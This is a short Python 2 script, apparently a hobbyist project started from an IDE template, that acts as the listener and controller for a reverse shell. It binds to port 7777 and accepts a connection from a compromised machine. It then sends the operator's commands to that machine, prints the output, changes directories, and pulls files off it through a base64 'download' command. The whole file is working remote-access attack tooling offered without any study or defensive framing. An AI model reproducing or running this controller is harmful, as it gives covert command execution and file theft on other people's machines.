# coding=utf-8
# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import socket
import base64


def shell():
    current_dir = target.recv(1024)
    while True:
        comando = raw_input("{}~#: ".format(current_dir))
        if comando == "exit":
            target.send(comando)
            break
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print (res)

        elif comando == "":
            pass
        elif comando[:8] == "download":
            target.send(comando)
            with open(comando[9:], 'wb') as file_download:
                datos = target.recv(30000)
                file_download.write(base64.b64decode(datos))

        else:
            target.send(comando)
            res = target.recv(30000)
            if res == "1":
                continue
            else:
                print(res)


def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("192.168.1.96", 7777))
    server.listen(1)

    print("Running server.....")

    target, ip = server.accept()
    print("cnx recv of:" + str(ip[0]))


upserver()
shell()

server.close()
